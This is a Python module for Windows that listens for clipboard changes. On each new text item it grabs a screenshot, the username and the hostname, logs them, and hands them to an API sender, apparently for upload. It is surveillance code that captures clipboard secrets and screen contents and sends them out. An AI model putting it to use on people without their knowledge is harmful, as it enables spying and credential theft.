import win32clipboard
import win32con
import utility
import win32gui, win32api
import ctypes
import main
from pathlib import Path
import pyautogui
from PIL import Image
import os
import getpass
import socket
import io
import apiSender
import time
import json

previous_content = None

# To Listen to a Windows Signal we need to have some kind of window that can hook into it. Somehow :D. I read this kind of things on a Blog and some Stackoverflow discussions. Have to dig deeper into it.
def create_window():
    wc = win32gui.WNDCLASS()
    wc.lpfnWndProc = wnd_proc
    wc.lpszClassName = "ClipboardMonitorWindow"
    wc.hInstance = win32api.GetModuleHandle(None)
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(class_atom, "ClipboardMonitorWindow", 0, 0, 0, 0, 0, 0, 0, wc.hInstance, None)
    ctypes.windll.user32.AddClipboardFormatListener(hwnd)
    return hwnd

def wnd_proc(hwnd, msg, wparam, lparam):
    if msg == 0x031D:  # WM_CLIPBOARDUPDATE
        process_clipboard()
    return 0

def process_clipboard():
    global previous_content
    current_content = get_clipboard_content()
    if current_content and current_content != previous_content:
        print("Detected new clipboard content, logging.")
        print(current_content)
        imageByteArray = do_screenshot()
        username = read_username()
        hostname = read_hostname()

        data = {
        "username": username,
        "hostname": hostname,
        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
        "content": current_content,
        }

        utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
        apiSender.send(imageByteArray, data)
        previous_content = current_content

def get_clipboard_content():
    content = None
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            content = data if isinstance(data, str) else None
    except Exception as e:
        print(f"Error accessing clipboard: {e}")
    finally:
        win32clipboard.CloseClipboard()
    return content

def do_screenshot():
    screenshot = pyautogui.screenshot()
    temp_file = 'temp_screenshot.png'
    screenshot.save(temp_file)
    img = Image.open(temp_file)
    img.show()
    width, height = img.size
    print(f'Screenshot dimensions: {width} x {height} pixels')
    return byteArray(screenshot)

def byteArray(screenshot):
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    byte_data = img_byte_arr.getvalue()
    img_byte_arr.seek(0)  
    return byte_data

def read_username():
    username = getpass.getuser()
    print(f"Username: {username}")
    return username

def read_hostname():
    hostname = socket.gethostname()
    print(f"hostname: {hostname}")
    return hostname

def monitor_clipboard():
    hwnd = create_window()
    while True:
        win32gui.PumpWaitingMessages()
